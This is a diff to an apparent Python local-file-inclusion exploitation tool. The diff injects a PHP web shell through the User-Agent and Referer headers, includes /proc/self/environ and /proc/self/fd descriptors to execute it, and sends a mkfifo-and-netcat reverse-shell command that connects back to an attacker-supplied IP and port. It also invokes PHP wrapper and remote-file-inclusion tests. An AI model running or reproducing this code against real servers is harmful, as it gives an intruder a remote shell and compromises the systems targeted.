@@ -401,20 +401,22 @@ def exploit(exploits, method):
                 tempHeaders['User-Agent'] = "<?php echo shell_exec($_GET['cmd']); ?>"
                 tempHeaders['Referer'] = "<?php echo shell_exec($_GET['cmd']); ?>"
                 u = url.replace('TMP', '/proc/self/environ')
-                
+               
+                #Code injection
                 res = requests.get(u, headers =tempHeaders, proxies = proxies)
                 if(args.verbose):
                     print("[i] Trying to send reverse shell using /proc/self/environ LFI ...")
-
-                u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
+                
+                #Exploit
+                u = url.replace('TMP', "/proc/self/environ&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
                 res = requests.get(u, headers = tempHeaders, proxies = proxies)
                 
+                #/proc/self/fd/ LFI to rev shell
                 if(args.verbose):
                    print("[i] Bruteforcing /proc/self/fd descriptors ...")
                
-                #/proc/self/fd/ LFI to rev shell
                 for i in range(15):
-                    u = url.replace('TMP', "/proc/self/fd/{0}".format(i))
+                    u = url.replace('TMP', "/proc/self/fd/{0}".format(i) + "?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
                     if(args.verbose): print(u)
                     requests.get(u, headers = tempHeaders, proxies = proxies)
                
@@ -464,8 +466,8 @@ def main():
     if(default):
         test_php_filter(url)
         test_php_input(url)
-        test_data_wrapper(url)
-        test_expect_wrapper(url)
+        test_php_data(url)
+        test_php_expect(url)
         test_rfi(url)
 
     print("Done.")
